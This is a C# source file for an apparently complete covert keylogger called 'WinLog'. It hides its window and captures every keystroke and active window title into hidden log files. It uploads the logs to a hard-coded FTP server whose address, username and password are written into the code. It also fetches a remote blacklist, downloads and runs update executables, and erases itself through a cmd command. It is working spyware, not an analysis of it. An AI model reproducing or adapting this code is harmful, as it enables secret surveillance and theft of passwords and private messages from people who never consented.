using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Logger
{
	public partial class MainForm : Form
	{
		private readonly static string version = "1.0.0";

		private static Random random = new Random((int)DateTime.Now.Ticks);
		
		private readonly static string nl = Environment.NewLine;
		private readonly static char dsp = Path.DirectorySeparatorChar;

		private readonly static string UID = Process.GetCurrentProcess().MainModule.FileName;
		private readonly static string[] DefaultFTPSettings = new string[] { "ftp://thewatchman.vacau.com/", "a8466566", "qA6rU7Uh" };
		private readonly static RegistryKey registry = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
		private static string cWin = null;

		public static string file = NewFile;
		private static string blacklistFile = "blacklist.txt";
		private static string updateFile = "update.txt";
		private static string updatePackageFile = "update.exe";

		private static bool uninstall = false;
		private static bool update = false;

		public static string updateResult;

		private static FTPManager ftp = new FTPManager(DefaultFTPSettings);

		private static string NewFile
		{
			get 
			{
				return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + dsp + Environment.UserName + "-" + System.DateTime.Now.Month + "-" + System.DateTime.Now.Day + "-" + System.DateTime.Now.Year + "--" + System.DateTime.Now.Hour + "-" + System.DateTime.Now.Minute + "-" + System.DateTime.Now.Second + @".log";
			}
		}
		
		public MainForm()
		{
			InitializeComponent();
		}
		
		private void OnStart(object sender, EventArgs e)
		{
			this.Hide();
			File.WriteAllText(file, string.Format("Logging started (WinLog v{2})- {1}{0}", nl, System.DateTime.Now, version));
			File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);

			if (updateResult != null)
			{
				File.WriteAllText(file, string.Format("Update result - {2} - {1}{0}", nl, System.DateTime.Now, updateResult));
			}
		}
		
		public void OnStop(object sender, SessionEndingEventArgs e)
		{
			File.AppendAllText(file, string.Format("{0}{0}Logging stopped - ({2}) - {1}{0}", nl, System.DateTime.Now, e.Reason));
			
			CheckBlacklist();
			UploadToFTP();
	
			if (uninstall)
			{
				Uninstall();
			}

			File.Delete(file);
		}

		private static string RandomString(int size)
		{
			StringBuilder builder = new StringBuilder();
			char ch;

			for (int i = 0; i < size; i++)
			{
				ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
				builder.Append(ch);
			}

			return builder.ToString();
		}

		private static void UploadToFTP()
		{
			ftp.CreateDirectory("logs" + dsp + Environment.UserName);
			ftp.UploadFile("logs" + dsp + Environment.UserName + dsp + Path.GetFileName(file), file);

			RegenLog();
		}

		private static void CheckBlacklist()
		{
			string blacklist = ftp.ReadFile(blacklistFile);

			if (blacklist.Contains(Environment.UserName))
			{
				File.AppendAllText(file, string.Format("{0}{0}Logger terminated - ({2}) - {1}{0}", nl, System.DateTime.Now, "Blacklisted"));
				uninstall = true;
			}
		}

		private static void CheckUpdate()
		{
			string newVersion = ftp.ReadFile(updateFile);

			if (newVersion != version)
			{
				update = true;
			}
		}
		
		private static void RegenLog()
		{
			File.Delete(file);
			file = NewFile;
			File.WriteAllText(file, string.Format("Logging continued - {1}{0}", nl, System.DateTime.Now));
			File.SetAttributes(file, File.GetAttributes(file) | FileAttributes.Hidden);
		}

		private static void Kill()
		{
			File.Delete(file);
			Application.Exit();
		}

		private static void Uninstall()
		{
			File.Delete(file);
			registry.DeleteValue(UID, false);

			Process remover = new Process();
			remover.StartInfo.FileName = "cmd.exe";
			remover.StartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & DEL" + Application.ExecutablePath;
			remover.Start();

			Application.Exit();
		}

		new private static void Update()
		{
			try
			{
				ftp.DownloadFile(updatePackageFile, updatePackageFile);

				Process updater = new Process();
				updater.StartInfo.FileName = updatePackageFile;
				updater.StartInfo.Arguments = UID.ToString();
				//updater.StartInfo.CreateNoWindow = true;
				//updater.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				updater.Start();
				
				Kill();
			}
			catch (Exception e)
			{
				File.AppendAllText(file, string.Format("{0}{0}Update Error - ({2}) - {1}{0}", nl, System.DateTime.Now, e.ToString()));
			}
		}

		private void GetWindowTimer_Tick(object sender, EventArgs e)
		{
			if (cWin != CurrentWindow.GetActiveWindow())
			{
				cWin = CurrentWindow.GetActiveWindow();

				if (cWin != null)
				{
					File.AppendAllText(file, string.Format("{0}Window - {1}{0}", nl, cWin));
				}
			}
		}

		private void UploadToFTP_Tick(object sender, EventArgs e)
		{
			File.AppendAllText(file, string.Format("{0}{0}Logging stopped - ({2}) - {1}{0}", nl, System.DateTime.Now, "Log uploaded"));

			CheckBlacklist();
			UploadToFTP();
			CheckUpdate();

			if (uninstall)
			{
				Uninstall();
			}

			if (update)
			{
				Update();
			}
		}

		private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
		{
			File.AppendAllText(file, string.Format(e.KeyChar.ToString()));
		}
	}
}